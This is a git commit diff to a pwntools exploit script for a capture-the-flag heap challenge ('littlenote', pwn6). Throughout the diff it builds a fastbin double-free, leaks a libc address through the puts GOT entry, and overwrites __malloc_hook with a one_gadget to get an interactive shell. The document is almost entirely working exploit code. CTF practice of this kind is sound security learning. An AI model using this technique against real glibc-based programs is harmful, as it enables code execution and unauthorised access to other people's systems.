a8083b470666d07b4b8955c64060f4777f6e65a0
0gur1 <904466829@qq.com>
2019-01-17 05:07:49 -0800

    2018.12.07 littlenote modify

--- pcb/pwn6/littlenote.py
+++ pcb/pwn6/littlenote.py
@@ -24,12 +24,12 @@ add("0gur1")
 add("1gur1")
 free(0)		#fastbin->0
 free(1)		#fastbin->1->0
-add("2gur1",'N')#fastbin->1->0
 free(0)		#fastbin->0->1->0
 
+
 add(p64(stderr-0x3))#fastbin->1->0->stderr-0x3
-add("4gur1")#fastbin->0->stderr-0x3
-add("5gur1")#fastbin->stderr-0x3
+add("3gur1")#fastbin->0->stderr-0x3
+add("4gur1")#fastbin->stderr-0x3
 add('a'*0x13+p64(puts_got))#note[0]=puts_got
 show(0)
 
@@ -38,18 +38,18 @@ log.info("puts_addr:%#x",puts_addr)
 malloc_hook = puts_addr-(libc.symbols['puts']-libc.symbols['__malloc_hook'])
 log.info("malloc_hook:%#x",malloc_hook)
 one_gadget = puts_addr - libc.symbols['puts']+gadget[1]
+add("6gur1")
 add("7gur1")
-add("8gur1")
-free(7)		#fastbin->7
-free(8)		#fastbin->8->7
-add("9gur1",'N')#fastbin->8->7
-free(7)		#fastbin->7->8->7	
+free(6)		#fastbin->6
+free(7)		#fastbin->7->6
+free(6)		#fastbin->6->7->6	
 
-add(p64(malloc_hook-0x23))#fastbin->8->7->malloc_hook-0x23
-add("agur1")#fastbin->7->malloc_hook-0x23
-add("bgur1")#fastbin->malloc_hook-0x23
+add(p64(malloc_hook-0x23))#fastbin->7->6->malloc_hook-0x23
+add("9gur1")#fastbin->6->malloc_hook-0x23
+add("agur1")#fastbin->malloc_hook-0x23
 add(0x13*'a'+p64(one_gadget))
 #gdb.attach(p)
 
 p.sendlineafter("Your choice:\n",'1')
+
 p.interactive()
